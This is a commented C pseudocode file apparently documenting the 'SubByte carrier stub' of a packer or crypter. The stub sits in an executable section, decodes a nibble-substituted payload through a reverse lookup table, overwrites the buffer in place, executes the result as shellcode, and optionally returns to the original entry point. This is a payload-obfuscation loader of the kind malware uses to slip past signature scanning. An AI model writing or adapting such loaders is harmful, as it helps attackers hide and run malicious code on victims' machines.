/*
 * subbyte_carrier.c — Reference C pseudocode for the SubByte carrier stub
 *
 * NOT COMPILED. Documents the logic matching stubs.rs::SUBBYTE_STUB_CODE.
 *
 * Section data layout:
 *   [stub_code (93 bytes)] [reverse_lut (256 bytes)] [encoded_payload (2*N bytes)]
 *
 * SubByte encoding splits each byte into two nibbles (high, low), each mapped
 * through a 16-entry forward LUT. The reverse LUT (256 bytes, sparse) maps
 * encoded_byte → nibble_value for O(1) decode.
 *
 * Decoded output is written in-place: decoded[i] overwrites encoded[i*2].
 * This is safe because write offset i < read offset i*2 for all i >= 0.
 */

#include <stdint.h>

extern uint8_t  REVERSE_LUT[256];  // → 256-byte reverse lookup table
extern uint8_t* ENCODED_ADDR;      // → encoded payload (LUT + 256)
extern uint32_t PAYLOAD_LEN;       // original payload length (half of encoded length)
extern void*    OEP_ADDR;          // optional OEP return (RIP-relative)

void subbyte_carrier_stub(void) {
    // === RSP alignment ===
    // push rsi, rdi, rbx
    // and rsp, -16
    // sub rsp, 0x28

    uint8_t* reverse = REVERSE_LUT;
    uint8_t* encoded = ENCODED_ADDR;  // = reverse + 256

    // === Decode: reverse nibble mapping ===
    for (uint32_t i = 0; i < PAYLOAD_LEN; i++) {
        uint8_t hi_enc = encoded[i * 2];
        uint8_t lo_enc = encoded[i * 2 + 1];
        uint8_t hi_nibble = reverse[hi_enc];
        uint8_t lo_nibble = reverse[lo_enc];
        encoded[i] = (hi_nibble << 4) | lo_nibble;  // in-place overwrite
    }

    // === Execute decoded shellcode ===
    ((void(*)(void))encoded)();

    // === Optional OEP return / cleanup ===
}
